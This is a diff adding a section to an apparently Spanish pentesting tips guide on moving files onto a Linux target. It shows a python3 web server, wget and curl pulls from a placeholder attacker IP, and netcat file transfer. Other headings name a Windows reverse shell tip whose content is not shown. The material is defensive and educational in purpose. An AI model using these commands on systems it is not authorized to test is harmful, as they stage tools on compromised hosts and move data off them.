@@ -699,3 +699,48 @@ Como se puede observar en el primer ```ls``` la dimensión no esta ajustada corr
 ## Tip #18: Generar una reverse shell para Windows
 ## Tip #19: Transferencia de archivos en Windows
 ## Tip #20: Transferencia de archivos en Linux
+### Mediante servidor web
+Para transferir archivos a una maquina remota primero debemos ubicarnos en el directorio donde esta ubicado el archivo a transferir y luego inicamos un servidor web mediante python3:
+```bash
+┌──(jorge㉿pentest)-[/tmp]
+└─$ ls                       
+test.txt
+
+┌──(jorge㉿pentest)-[/tmp]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+#### wget
+wget es una utilidad en linux que permite obtener archivos descargandolos de servidores web:
+```bash
+alberto@remote:/tmp$ wget http://<nuestra-IP-atacante>/test.txt
+
+--2025-01-20 18:23:23--  http://<nuestra-IP-atacante>/test.txt
+Connecting to <nuestra-IP-atacante>:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 19 [text/plain]
+Saving to: ‘test.txt’
+
+test.txt                                  100%[===================================================================================>]      19  --.-KB/s    in 0s      
+
+2025-01-20 18:23:24 (1.17 MB/s) - ‘test.txt’ saved [19/19]
+```
+#### curl
+curl tambien permite obtener archivos de servidores web:
+```bash
+alberto@remote:/tmp$ curl http://<nuestra-IP-atacante>/test.txt -o test.txt
+
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100    19  100    19    0     0    126      0 --:--:-- --:--:-- --:--:--   126
+```
+### Mediante red
+#### netcat
+En la maquina que recibira el archivo ejecutaremos el siguiente comando:
+```bash
+alberto@remote:/tmp$ nc -l -p 1234 > test.txt
+```
+Ahora en la maquina que envia el archivo ejecutaremos el siguiente comando:
+```bash
+nc -w 3 [IP-que-recibe-el-archivo] 1234 < test.txt
+```
